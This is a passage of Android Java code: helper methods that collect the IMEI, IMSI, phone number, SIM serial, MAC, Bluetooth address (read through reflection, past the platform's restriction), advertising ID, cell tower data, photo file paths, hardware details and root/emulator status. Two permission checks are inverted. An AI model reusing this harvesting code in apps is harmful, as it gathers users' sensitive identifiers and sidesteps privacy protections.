    private static JSONObject getAppInfo(Context context) {
        JSONObject jsonObject = new JSONObject();
        try {
            PackageManager packageManager = context.getPackageManager();
            PackageInfo packageInfo = packageManager.getPackageInfo(context.getPackageName(), 0);
            int labelRes = packageInfo.applicationInfo.labelRes;
            String label = context.getResources().getString(labelRes);
            String versionName = packageInfo.versionName;
            int versionCode = packageInfo.versionCode;
            String packageName = context.getPackageName();
            jsonObject.put("versionName", isNullText(versionName));
            jsonObject.put("versionCode", versionCode);
            jsonObject.put("label", isNullText(label));
            jsonObject.put("packageName", isNullText(packageName));
            jsonObject.put("sign", isNullText(getSingInfo(context.getApplicationContext(), packageName, "SHA1")));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonObject;

    }

    private static JSONArray getSensor(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            SensorManager sm = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
            List<Sensor> list = sm.getSensorList(Sensor.TYPE_ALL);
            for (Sensor sensor : list) {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("type", isNullText(sensor.getType() + ""));
                jsonObject.put("name", isNullText(sensor.getName()));
                jsonObject.put("version", isNullText(sensor.getVersion() + ""));
                jsonObject.put("vendor", isNullText(sensor.getVendor()));
                jsonObject.put("maxRange", isNullText(sensor.getMaximumRange() + ""));
                jsonObject.put("minDelay", isNullText(sensor.getMinDelay() + ""));
                jsonObject.put("power", isNullText(sensor.getPower() + ""));
                jsonObject.put("resolution", isNullText(sensor.getResolution() + ""));
                jsonArray.put(jsonObject);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static String getSingInfo(Context context, String packageName, String type) {
        String tmp = null;
        Signature[] signs = getSignatures(context, packageName);
        for (Signature sig : signs) {
            if ("SHA1".equals(type)) {
                tmp = getSignatureString(sig, "SHA1");
                break;
            }
        }
        return tmp;
    }

    private static Signature[] getSignatures(Context context, String packageName) {
        PackageInfo packageInfo = null;
        try {
            packageInfo = context.getPackageManager().getPackageInfo(packageName, PackageManager.GET_SIGNATURES);
            return packageInfo.signatures;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return null;
    }

    private static String getSignatureString(Signature sig, String type) {
        byte[] hexBytes = sig.toByteArray();
        String fingerprint = "error!";
        try {
            MessageDigest digest = MessageDigest.getInstance(type);
            if (digest != null) {
                byte[] digestBytes = digest.digest(hexBytes);
                StringBuilder sb = new StringBuilder();
                for (byte digestByte : digestBytes) {
                    sb.append((Integer.toHexString((digestByte & 0xFF) | 0x100)).substring(1, 3));
                }
                fingerprint = sb.toString();
            }
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        return fingerprint;
    }

    private static String getBlueToothAddress(BluetoothAdapter bluetoothAdapter) {
        if (bluetoothAdapter.isEnabled() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Field field;
            try {
                field = BluetoothAdapter.class.getDeclaredField("mService");
                field.setAccessible(true);
                Object bluetoothManagerService = field.get(bluetoothAdapter);
                if (bluetoothManagerService == null) {
                    return null;
                }
                Method method = bluetoothManagerService.getClass().getMethod("getAddress");
                if (method != null) {
                    Object obj = method.invoke(bluetoothManagerService);
                    if (obj != null) {
                        return obj.toString();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    private static String intToIpAddress(long ipInt) {
        StringBuffer sb = new StringBuffer();
        sb.append(ipInt & 0xFF).append(".");
        sb.append((ipInt >> 8) & 0xFF).append(".");
        sb.append((ipInt >> 16) & 0xFF).append(".");
        sb.append((ipInt >> 24) & 0xFF);
        return sb.toString();
    }

    @SuppressLint("MissingPermission")
    private static String getDriverUUID(Context context) {
        if (!PageUtils.isPhoneStateGranted(context))
            return "";

        final TelephonyManager tm = getTelephonyManager(context);
        final String tmDevice, tmSerial, tmPhone, androidId;
        tmDevice = "" + tm.getDeviceId();
        tmSerial = "" + tm.getSimSerialNumber();
        androidId = "" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        UUID deviceUuid = new UUID(androidId.hashCode(), ((long) tmDevice.hashCode() << 32) | tmSerial.hashCode());
        return deviceUuid.toString();
    }

    @SuppressLint("MissingPermission")
    private static String getImsi(Context context) {
        if (!PageUtils.isPhoneStateGranted(context))
            return "";
        return getTelephonyManager(context).getSubscriberId();
    }

    @SuppressLint("MissingPermission")
    private static String getLine1Number(Context context) {
        if (!PageUtils.isPhoneStateGranted(context))
            return "";
        return getTelephonyManager(context).getLine1Number();
    }

    @SuppressLint("MissingPermission")
    private static String getDeviceId(Context context) {
        if (!PageUtils.isPhoneStateGranted(context))
            return "";
        return getTelephonyManager(context).getDeviceId();
    }

    @SuppressLint("MissingPermission")
    private static Map<String, Object> getCellInfo(Context context) {
        Map<String, Object> map = new HashMap<>();
        if (!PageUtils.isCoarseLocationGranted(context))
            return map;

        int dbm = -1;
        int cid = -1;
        List<CellInfo> cellInfoList;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            cellInfoList = getTelephonyManager(context).getAllCellInfo();
            if (null != cellInfoList) {
                for (CellInfo cellInfo : cellInfoList) {
                    if (cellInfo instanceof CellInfoGsm) {
                        CellSignalStrengthGsm cellSignalStrengthGsm = ((CellInfoGsm) cellInfo).getCellSignalStrength();
                        dbm = cellSignalStrengthGsm.getDbm();
                        cid = ((CellInfoGsm) cellInfo).getCellIdentity().getCid();
                    } else if (cellInfo instanceof CellInfoCdma) {
                        CellSignalStrengthCdma cellSignalStrengthCdma = ((CellInfoCdma) cellInfo).getCellSignalStrength();
                        dbm = cellSignalStrengthCdma.getDbm();
                        cid = ((CellInfoCdma) cellInfo).getCellIdentity().getBasestationId();
                    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2 && cellInfo instanceof CellInfoWcdma) {
                        CellSignalStrengthWcdma cellSignalStrengthWcdma = ((CellInfoWcdma) cellInfo).getCellSignalStrength();
                        dbm = cellSignalStrengthWcdma.getDbm();
                        cid = ((CellInfoWcdma) cellInfo).getCellIdentity().getCid();
                    } else if (cellInfo instanceof CellInfoLte) {
                        CellSignalStrengthLte cellSignalStrengthLte = ((CellInfoLte) cellInfo).getCellSignalStrength();
                        dbm = cellSignalStrengthLte.getDbm();
                        cid = ((CellInfoLte) cellInfo).getCellIdentity().getCi();
                    }
                }
            }
        }
        map.put("dbm", dbm);
        map.put("cid", cid);
        return map;
    }

    private static String getLocalDNS() {
        Process cmdProcess = null;
        BufferedReader reader = null;
        try {
            cmdProcess = Runtime.getRuntime().exec("getprop net.dns1");
            reader = new BufferedReader(new InputStreamReader(cmdProcess.getInputStream()));
            return reader.readLine();
        } catch (IOException e) {
            return null;
        } finally {
            try {
                reader.close();
            } catch (IOException e) {
            }
            cmdProcess.destroy();
        }
    }

    private static String getOsLanguage(Context context) {
        Locale locale = context.getResources().getConfiguration().locale;
        return locale.getLanguage();
    }

    private static String getLocaleDisplayLanguage() {
        return Locale.getDefault().getDisplayLanguage();
    }

    private static String getTimeZoneId() {
        return TimeZone.getDefault().getID();
    }

    private static String getISO3Country(Context context) {
        Locale locale = context.getResources().getConfiguration().locale;
        return locale.getISO3Country();
    }

    private static String getISO3Language(Context context) {
        Locale locale = context.getResources().getConfiguration().locale;
        return locale.getISO3Language();
    }

    private static String getMCC(Context context) {
        Configuration cfg = context.getResources().getConfiguration();
        return String.valueOf(cfg.mcc);
    }

    private static String getMNC(Context context) {
        Configuration cfg = context.getResources().getConfiguration();
        return String.valueOf(cfg.mnc);
    }

    private static String getPhoneType(Context context) {
        String phoneTypeStr = "";
        int phoneType = getTelephonyManager(context).getPhoneType();
        switch (phoneType) {
            case TelephonyManager.PHONE_TYPE_CDMA:
                phoneTypeStr = "CDMA";
                break;
            case TelephonyManager.PHONE_TYPE_GSM:
                phoneTypeStr = "GSM";
                break;
            case TelephonyManager.PHONE_TYPE_SIP:
                phoneTypeStr = "SIP";
                break;
            case TelephonyManager.PHONE_TYPE_NONE:
                phoneTypeStr = "None";
                break;
        }
        return phoneTypeStr;
    }

    private static String getNetWorkModel(Context context) {
        if (isWifiAvailable(context)) {
            return "NETWORK_WIFI";
        } else if (isNetwork4G(context)) {
            return "NETWORK_4G";
        } else if (isNetwork3G(context)) {
            return "NETWORK_3G";
        } else if (isNetwork2G(context)) {
            return "NETWORK_2G";
        } else {
            return "NETWORK_UNKNOWN";
        }
    }

    private static boolean isWifiAvailable(Context ctx) {
        ConnectivityManager conMan = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (conMan == null) {
            return false;
        }
        NetworkInfo wifiInfo = conMan.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        return (wifiInfo != null && wifiInfo.getState() == NetworkInfo.State.CONNECTED);
    }

    private static boolean isNetwork2G(Context context) {
        int subType = getMobileNetworkType(context);
        return (subType == TelephonyManager.NETWORK_TYPE_CDMA
                || subType == TelephonyManager.NETWORK_TYPE_EDGE
                || subType == TelephonyManager.NETWORK_TYPE_GPRS
                || subType == TelephonyManager.NETWORK_TYPE_1xRTT || subType == TelephonyManager.NETWORK_TYPE_IDEN);
    }

    private static boolean isNetwork3G(Context context) {
        int subType = getMobileNetworkType(context);
        boolean ret = (subType == TelephonyManager.NETWORK_TYPE_UMTS
                || subType == TelephonyManager.NETWORK_TYPE_HSDPA
                || subType == TelephonyManager.NETWORK_TYPE_EVDO_0
                || subType == TelephonyManager.NETWORK_TYPE_EVDO_A
                || subType == TelephonyManager.NETWORK_TYPE_EVDO_B
                || subType == TelephonyManager.NETWORK_TYPE_HSPA
                || subType == TelephonyManager.NETWORK_TYPE_EHRPD || subType == TelephonyManager.NETWORK_TYPE_HSUPA); // TODO:
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR2) {
            ret = ret || subType == TelephonyManager.NETWORK_TYPE_HSPAP;
        }
        return ret;
    }

    private static boolean isNetwork4G(Context context) {
        return getMobileNetworkType(context) == TelephonyManager.NETWORK_TYPE_LTE;
    }

    private static int getMobileNetworkType(Context context) {
        ConnectivityManager connectMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = connectMgr.getActiveNetworkInfo();
        if (info != null && info.getType() == ConnectivityManager.TYPE_MOBILE) {
            return info.getSubtype();
        }
        return -1;
    }

    private static String getNetworkOperatorName(Context context) {
        return getTelephonyManager(context).getNetworkOperatorName();
    }

    private static String getSimCountryIso(Context context) {
        return getTelephonyManager(context).getSimCountryIso();
    }

    private static String getNetworkOperator(Context context) {
        return getTelephonyManager(context).getNetworkOperator();
    }

    private static String getGaid(Context context) {
        String gaid = "";
        try {
            AdvertisingIdClient.AdInfo adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
            gaid = adInfo.getId();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return gaid;
    }

    private static String getMacAddress(Context context) {
        String mac = "";
        try {
            WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            mac = wifi.getConnectionInfo().getMacAddress();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return mac;
    }

    private static TelephonyManager getTelephonyManager(Context context) {
        return (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    }

    private static String isNullText(String text) {
        if (TextUtils.isEmpty(text))
            return "";
        return text;
    }

    private static String getPhysicalSize(Context context) {
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Display defaultDisplay = windowManager.getDefaultDisplay();
        DisplayMetrics displayMetrics = new DisplayMetrics();
        defaultDisplay.getMetrics(displayMetrics);
        return Double.toString(Math.sqrt(Math.pow((double) (((float) displayMetrics.heightPixels) / displayMetrics.ydpi), 2.0d) + Math.pow((double) (((float) displayMetrics.widthPixels) / displayMetrics.xdpi), 2.0d)));
    }

    private static String getCpuName() {
        try {
            FileReader fr = new FileReader("/proc/cpuinfo");
            BufferedReader br = new BufferedReader(fr);
            String text = br.readLine();
            String[] array = text.split(":\\s+", 2);
            for (int i = 0; i < array.length; i++) {
            }
            return array[1];
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    private static long getAvailableInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();
        long availableBlocks = stat.getAvailableBlocks();
        return availableBlocks * blockSize;
    }

    private static long getTotalInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();
        long totalBlocks = stat.getBlockCount();
        return totalBlocks * blockSize;
    }


    private static String getRamTotalSize(Context context) {
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        activityManager.getMemoryInfo(memoryInfo);
        return memoryInfo.totalMem + "";
    }

    private static String getRamAvailSize(Context context) {
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        activityManager.getMemoryInfo(memoryInfo);
        return memoryInfo.availMem + "";
    }

    private static String getRootDirectory() {
        return Environment.getExternalStorageDirectory().getAbsolutePath();
    }

    private static String getExternalStorageDirectory() {
        return System.getenv("SECONDARY_STORAGE");
    }

    private static long getLastBootTime() {
        long lastBootTime = System.currentTimeMillis() - SystemClock.elapsedRealtime();
        return lastBootTime;
    }

    private static boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.toLowerCase().contains("vbox")
                || Build.FINGERPRINT.toLowerCase().contains("test-keys")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT);
    }

    private static boolean isRooted() {
        String buildTags = Build.TAGS;
        if (buildTags != null && buildTags.contains("test-keys")) {
            return true;
        }

        String[] paths = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
                "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"};
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }

        Process process = null;
        try {
            process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            if (in.readLine() != null) return true;
            return false;
        } catch (Throwable t) {
            return false;
        } finally {
            if (process != null) process.destroy();
        }
    }

    private static JSONObject getSDInfo() {
        JSONObject jsonObject = new JSONObject();
        try {
            if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
                File path = Environment.getExternalStorageDirectory();
                StatFs sf = new StatFs(path.getPath());
                long blockSize = sf.getBlockSize();
                long totalBlock = sf.getBlockCount();
                long availableBlock = sf.getAvailableBlocks();
                long totalLong = totalBlock * blockSize;
                long freeLong = availableBlock * blockSize;
                long useLong = totalLong - freeLong;
                jsonObject.put("totalSize", totalLong);
                jsonObject.put("freeSize", freeLong);
                jsonObject.put("useSize", useLong);
                return jsonObject;
            } else if (Environment.getExternalStorageState().equals(Environment.MEDIA_REMOVED)) {
                return null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static List<String> getSystemPhotoList(Context context) {
        List<String> result = new ArrayList<String>();
        if (!PageUtils.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)) {
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(uri, null, null, null, null);
            if (cursor == null || cursor.getCount() <= 0) {
                return null;
            }
            while (cursor.moveToNext()) {
                int index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                String path = cursor.getString(index);
                File file = new File(path);
                if (file.exists()) {
                    result.add(path);
                }
            }
        }
        return result;
    }

    private static String getSimSerialNumber(Context context) {
        boolean flag = PageUtils.checkPermission(context, Manifest.permission.READ_PHONE_STATE);
        if (!flag) {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            return tm.getSimSerialNumber();
        }
        return "";
    }

    private static String getKeyboard(Context context) {
        Configuration cfg = context.getResources().getConfiguration();
        return cfg.keyboard + "";
    }

    private static String getDriverSerial() {
        return Build.SERIAL;
    }

    private static String getDriverBrand() {
        return Build.BRAND;
    }

    private static String getDriverModel() {
        return Build.MODEL;
    }

    private static String getDriverReleaseVersion() {
        return Build.VERSION.RELEASE;
    }

    private static String getDriverSdkVersion() {
        return Build.VERSION.SDK;
    }

    private static String getDriverProduct() {
        return Build.PRODUCT;
    }

    private static String getDriverBoard() {
        return Build.BOARD;
    }

    private static String getDriverDisplay() {
        return Build.DISPLAY;
    }

    private static String getDriverId() {
        return Build.ID;
    }

    private static String getDriverBootloader() {
        return Build.BOOTLOADER;
    }

    private static String getDriverFingerprint() {
        return Build.FINGERPRINT;
    }

    private static String getDriverHost() {
        return Build.HOST;
    }

    private static String getDriverHardWare() {
        return Build.HARDWARE;
    }

    private static String getDriverDevice() {
        return Build.DEVICE;
    }

    private static String getDriverUser() {
        return Build.USER;
    }

    private static String getRadioVersion() {
        return Build.getRadioVersion();
    }

    private static String getDriverTags() {
        return Build.TAGS;
    }

    private static String getDriverTime() {
        return String.valueOf(Build.TIME);
    }

    private static String getDriverType() {
        return Build.TYPE;
    }
}
